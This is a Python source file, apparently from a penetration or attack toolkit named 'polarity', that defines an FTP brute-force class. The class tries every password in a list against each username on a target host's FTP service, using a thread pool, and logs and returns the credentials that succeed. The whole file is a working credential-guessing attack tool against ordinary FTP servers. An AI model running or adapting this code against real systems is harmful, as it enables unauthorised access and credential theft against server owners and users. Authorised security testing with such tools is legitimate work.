from ftplib import FTP
import logging
import multiprocessing
from multiprocessing.dummy import Pool as ThreadPool

from polarity.bruteforce.base import BaseBruteforce


class FTPBruteforce(BaseBruteforce):

    PORT = 21

    def __init__(self, host, users, passwords):
        super().__init__(host, users, passwords)

        self._current_user = None

    def start_bruteforce(self):
        logging.info("Starting FTP bruteforce against host %s",
                     self._host.ip_address)

        user_passwords = {}

        for user in self._users:
            self._current_user = user

            pool = ThreadPool(multiprocessing.cpu_count())
            results = pool.map(self.__check_password, self._passwords)

            results = list(filter(None, results))
            if results:
                password = results[0]

                logging.info("Password found: [%s] - %s", user, password)

                user_passwords[user] = password

        return user_passwords

    def __check_password(self, password):
        ftp = FTP(self._host.ip_address, timeout=0.5)
        try:
            ftp.login(self._current_user, password)
            ftp.close()

            return password
        except Exception:
            return None
